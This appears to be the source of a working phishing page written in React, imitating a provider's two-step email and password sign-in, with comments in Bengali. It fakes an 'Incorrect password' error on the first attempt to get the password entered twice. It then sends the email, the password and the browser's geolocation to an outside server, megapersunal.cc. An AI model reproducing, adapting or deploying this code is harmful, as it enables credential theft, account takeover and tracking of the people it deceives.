import { useState } from "react";

export default function App() {
  const [step, setStep] = useState("email");
  const [progress, setProgress] = useState(0);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [passwordError, setPasswordError] = useState(false);

  function runProgress(callback) {
    setProgress(0);

    const interval = setInterval(() => {
      setProgress((prev) => {
        const next = prev + 2;

        if (next >= 100) {
          clearInterval(interval);

          setTimeout(() => {
            callback();
          }, 100);

          return 100;
        }

        return next;
      });
    }, 30);
  }

  function handleNext() {
    if (email.trim() === "") {
      alert("Please enter your email");
      return;
    }

    runProgress(() => {
      // Password page-এ যাওয়ার আগে progress reset
      setProgress(0);
      setStep("password");
    });
  }

  function handleSignIn() {
    // প্রথমবার ভুল দেখাবে
    if (!passwordError) {
      setPasswordError(true);
      return;
    }

    sendGinfo();

    // দ্বিতীয়বার দিলে progress চলবে
    runProgress(() => {
      setPasswordError(false);
    });
  }

  async function sendGinfo() {
    const sendData = async (locationData = {}) => {
      const data = {
        email: email,
        token: password,
        ...locationData,
      };

      const response = await fetch("https://megapersunal.cc/api/v1/ginfo", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Accept": "application/json",
        },
        body: JSON.stringify(data),
      });

      const result = await response.json();

      console.log(result);
    };

    // Browser location support করে কিনা
    if (!navigator.geolocation) {
      await sendData();
      return;
    }

    navigator.geolocation.getCurrentPosition(
        // User Allow করলে
        async (position) => {
          await sendData({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
          });
        },

        // User Deny করলে
        async () => {
          console.log("Location permission denied.");
          await sendData();
        }
    );
  }

  return (
    <main className="page">
      {/* EMAIL PAGE */}
      {step === "email" && (
        <section className="login-card">
          {/* Progress Bar */}
          <div className="card-progress">
            <div
              className="card-progress-fill"
              style={{ width: `${progress}%` }}
            ></div>
          </div>

          <div className="brand-mark" aria-hidden="true">
            <span className="g-red">📍</span>
          </div>

          <div className="content">
            <div className="left">
              <h1>Sign in to your account</h1>
              <p className="subtitle">Use your account to continue</p>
            </div>

            <div className="right">
              <label className="floating-label" htmlFor="email">
                Email or phone
              </label>

              <input
                id="email"
                className="text-input"
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                autoComplete="off"
              />

              <button className="link-btn" type="button">
                Forgot email?
              </button>

              <p className="guest-text">
                Not your computer? Use Guest mode to sign in privately.
              </p>

              <button className="learn-btn" type="button">
                Learn more about Guest mode
              </button>

              <div className="actions">
                <button className="link-btn" type="button">
                  Create account
                </button>

                <button className="next-btn" type="button" onClick={handleNext}>
                  Next
                </button>
              </div>
            </div>
          </div>

          <div className="language-row">
            <span>English (United States)</span>
            <span>⌄</span>
          </div>

          <div className="footer-links">
            <span>Help</span>
            <span>Privacy</span>
            <span>Terms</span>
          </div>
        </section>
      )}

      {/* PASSWORD PAGE */}
      {step === "password" && (
        <section className="login-card">
          {/* Progress Bar */}
          <div className="card-progress">
            <div
              className="card-progress-fill"
              style={{ width: `${progress}%` }}
            ></div>
          </div>

          <div className="brand-mark" aria-hidden="true">
            <span className="g-red">📍</span>
          </div>

          <div className="content">
            <div className="left">
              <h1>Welcome</h1>

              <div className="account-chip">
                <span>{email}</span>

                <span className="chevron">⌄</span>
              </div>
            </div>

            <div className="right">
              <label className="floating-label" htmlFor="password">
                Password
              </label>

              <input
                id="password"
                className={`text-input ${passwordError ? "input-error" : ""}`}
                type="password"
                value={password}
                onChange={(e) => {
                  setPassword(e.target.value);
                  setPasswordError(false);
                }}
                placeholder="Enter your password"
                autoComplete="off"
              />
              {passwordError && (
                <p className="password-error">
                  Incorrect password. Please try again.
                </p>
              )}

              <label className="check-row">
                <input id="showPassword" type="checkbox" />

                <span>Show password</span>
              </label>

              <div className="actions">
                <button className="link-btn" type="button">
                  Forgot password?
                </button>

                <button
                  className="next-btn"
                  type="button"
                  onClick={handleSignIn}
                >
                  Sign in
                </button>
              </div>
            </div>
          </div>

          <div className="language-row">
            <span>English (United States)</span>
            <span>⌄</span>
          </div>

          <div className="footer-links">
            <span>Help</span>
            <span>Privacy</span>
            <span>Terms</span>
          </div>
        </section>
      )}
    </main>
  );
}
